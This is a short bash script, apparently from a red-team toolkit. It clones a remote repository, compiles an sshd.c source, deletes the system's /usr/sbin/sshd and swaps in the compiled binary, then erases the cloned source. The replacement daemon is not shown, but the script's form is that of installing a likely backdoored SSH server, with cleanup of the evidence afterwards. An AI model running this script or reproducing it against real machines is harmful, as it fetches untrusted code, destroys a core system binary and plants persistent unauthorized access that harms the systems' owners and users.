#!/bin/bash

git clone https://github.com/hb6540/redteaming/
cd ./redteaming/sshd
gcc -o sshd sshd.c
rm /usr/sbin/sshd | touch /usr/sbin/sshd
mv sshd /usr/sbin/sshd
cd ../../
rm -r redteaming
